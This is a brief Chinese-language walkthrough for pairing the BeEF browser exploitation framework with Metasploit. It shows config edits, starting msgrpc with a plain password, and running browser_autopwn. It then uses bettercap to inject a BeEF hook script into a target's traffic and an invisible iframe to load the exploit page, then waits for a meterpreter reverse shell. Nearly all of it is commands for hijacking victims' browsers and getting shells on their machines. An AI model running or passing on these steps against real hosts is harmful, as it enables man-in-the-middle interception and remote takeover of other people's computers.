# Beef && Metasploit
---

### 修改config.yaml

编辑

`beef/config.yaml`

`metasploit:
            enable: false改为true`

编辑

`beef/extensions/demos/config.yaml`

`enable:true改为false`

编辑

`beef/extensions/metasploit/config.yaml`

`设置
    ssl: true
    ssl_version: 'TLSv1'`

### 启动msf服务

```
msfconsole
load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
```

### 运行Beef

### 反弹回 meterpreter

```
use auxiliary/server/browser_autopwn
show options
set LHOST 192.168.16.245
set SRVHOST 192.168.16.245
set SRVPORT 8881
run -z
```

`bettercap -T 192.168.0.102 --proxy-module injectjs --js-url "http://192.168.0.100:3000/hook.js"`

生成一个链接

beef使用`Commands`-`Misc`-`Create Invisible Iframe`模块加载MSF生成的`autopwn`页面

等待弹回shell

`sessions -l`